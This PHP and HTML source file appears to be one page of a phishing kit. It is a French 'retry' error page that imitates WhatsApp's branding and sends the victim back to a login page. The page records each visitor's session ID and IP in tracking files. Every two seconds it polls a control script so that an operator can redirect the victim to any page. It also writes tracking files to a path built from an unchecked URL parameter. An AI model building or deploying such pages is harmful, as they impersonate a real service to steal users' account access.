<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'retry.php',
    'timestamp' => time(),
    'ip' => $clientIp
];
file_put_contents($trackingFile, json_encode($trackingData));
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Réessayer</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ecf5ee 0%, #d7f5d4 100%);
            color: #111;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 420px;
            width: 100%;
        }
        
        .card {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            padding: 40px 20px;
            text-align: center;
            margin-bottom: 20px;
            border-top: 5px solid #ffc107;
        }
        
        .icon {
            font-size: 72px;
            color: #ffc107;
            margin-bottom: 20px;
            display: inline-block;
            width: 120px;
            height: 120px;
            background-color: #fff8e1;
            border-radius: 50%;
            line-height: 120px;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        .title {
            font-size: 24px;
            font-weight: 600;
            color: #111;
            margin-bottom: 12px;
        }
        
        .message {
            color: #54656f;
            margin-bottom: 28px;
            font-size: 15px;
            line-height: 1.5;
        }
        
        .retry-button {
            display: inline-block;
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(37, 211, 102, 0.3);
        }
        
        .retry-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.4);
        }
        
        .retry-button:active {
            transform: translateY(0);
        }
        
        .retry-button i {
            margin-right: 8px;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #54656f;
            font-size: 12px;
        }
        
        .footer a {
            color: #25D366;
            text-decoration: none;
            font-weight: 500;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .card {
                padding: 30px 15px;
            }
            
            .icon {
                font-size: 60px;
                width: 100px;
                height: 100px;
                line-height: 100px;
            }
            
            .title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="icon">
                <i class="fas fa-redo"></i>
            </div>
            
            <div class="title">Veuillez réessayer</div>
            <p class="message">Une erreur est survenue lors du traitement de votre demande. Veuillez réessayer.</p>
            
            <!-- Retry Button -->
            <a href="connexion_f.php?session=<?php echo htmlspecialchars($sessionId); ?>&ip=<?php echo htmlspecialchars($clientIp); ?>" class="retry-button">
                <i class="fas fa-arrow-right"></i> Réessayer
            </a>
        </div>
        
        <div class="footer">
            <p>© 2026 WhatsApp. <a href="#">Confidentialité</a> · <a href="#">Conditions</a></p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            
            // Fonction pour vérifier s'il y a une action à effectuer
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action) {
                        if (data.action === 'custom' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la vérification des actions:', error);
                });
            }
            
            // Vérifier les actions toutes les 2 secondes
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>